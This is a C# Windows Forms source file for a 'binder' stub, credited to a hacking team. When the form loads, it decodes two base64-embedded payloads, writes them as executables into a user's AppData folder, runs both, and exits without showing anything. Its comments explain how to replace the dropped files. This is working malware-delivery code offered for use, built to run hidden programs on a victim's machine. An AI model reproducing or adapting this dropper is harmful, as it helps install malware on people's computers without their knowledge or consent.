using Freya_Binder.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Freya_Binder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            //Coded by Endarionn for TurkHackTeam!

            //If you want to replace the dropped files, add new base64 strings called base1.txt and base2.txt to the resources section and delete the old ones.

            //We read the base64string from the sources and assigned it to a variable.
            string base1 = Resources.base1;
            string base2 = Resources.base2;

            //We converted the base64 string we read into bytes.
            byte[] bytes1 = Convert.FromBase64String(base1);
            byte[] bytes2 = Convert.FromBase64String(base2);

            //Folder to drop files: Appdata.
            string path1 = @"C:\Users\ygzat\AppData\Roaming\file1.exe";
            string path2 = @"C:\Users\ygzat\AppData\Roaming\file2.exe";

            //We created the file to write the byte and ended the process with the .Dispose() command.
            File.Create(path1).Dispose();
            File.Create(path2).Dispose();

            //We printed the byte in the variable to the files we created.
            File.WriteAllBytes(path1, bytes1);
            File.WriteAllBytes(path2, bytes2);

            //We launched the applications.
            Process.Start(path1);
            Process.Start(path2);

            //We turned off Stub.
            Application.Exit();

        }
    }
}
